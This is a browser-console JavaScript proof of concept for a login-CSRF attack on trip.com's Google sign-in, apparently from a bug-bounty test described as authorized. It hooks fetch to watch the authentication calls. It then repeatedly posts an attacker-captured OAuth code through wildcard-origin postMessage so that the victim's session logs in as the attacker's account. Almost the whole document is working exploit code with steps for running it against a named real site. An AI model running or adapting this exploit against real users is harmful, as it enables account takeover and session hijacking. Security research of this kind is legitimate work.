// ===== PHASE 2: VICTIM profile — REPLAY the attacker's code =====
// In the VICTIM browser profile, go to https://www.trip.com/account/signin, open console, paste this,
// REPLACE the CODE below with the string you captured in Phase 1, then follow the on-screen step.
// Authorized test, sshabib. This binds the VICTIM session to the ATTACKER's Google identity if the vuln is live.

(function () {
  // >>> PASTE THE CAPTURED ATTACKER CODE HERE <<<
  const ATTACKER_CODE = 'REPLACE_WITH_CAPTURED_CODE';
  const TYPE = 'google';

  if (ATTACKER_CODE === 'REPLACE_WITH_CAPTURED_CODE') {
    console.log('%c[REPLAY] edit the script: set ATTACKER_CODE to the code you captured in Phase 1.', 'color:#f44;font-weight:bold');
    return;
  }

  // watch whether our replayed code reaches the login RPC
  const of = window.fetch;
  window.fetch = function (u, o) {
    try {
      const s = String((typeof u === 'string') ? u : (u && u.url) || '');
      const b = o && o.body ? String(o.body) : '';
      if (b.includes(ATTACKER_CODE)) console.log('%c[REPLAY] our code reached: ' + s, 'color:#0f0;font-weight:bold');
      if (s.includes('authenticateTrip') || s.includes('thirdPartyLogin')) console.log('%c[REPLAY] auth RPC fired: ' + s, 'color:#0af');
    } catch (e) {}
    return of.apply(this, arguments);
  };

  console.log('%c[REPLAY] ready. STEP: click "Continue with Google" on this page to ARM the SDK listener, then (a Google popup opens — you can close it) the sprayer below injects the attacker code.', 'color:#fa0;font-weight:bold');

  function shoot() {
    // popup-provider path (bindPostMsgFun)
    window.postMessage({ tpSignalCode: 'TRIP',  code: ATTACKER_CODE, type: TYPE }, '*');
    window.postMessage({ tpSignalCode: 'CTRIP', code: ATTACKER_CODE, type: TYPE }, '*');
    // middle-page path (receiveMiddlPageMessage) — code must be Number-coercible there, google path uses bindPostMsgFun anyway
    window.postMessage({ code: ATTACKER_CODE, message: '', context: '{}', token: ATTACKER_CODE, taskType: 1 }, '*');
  }
  let n = 0;
  const t = setInterval(function () { shoot(); if (++n > 200) clearInterval(t); }, 200);

  console.log('%c[REPLAY] spraying. After it runs, RELOAD this page and check the account menu / avatar — if you are now logged in as the ATTACKER Google identity, the login-CSRF is CONFIRMED.', 'color:#fa0;font-weight:bold');
})();
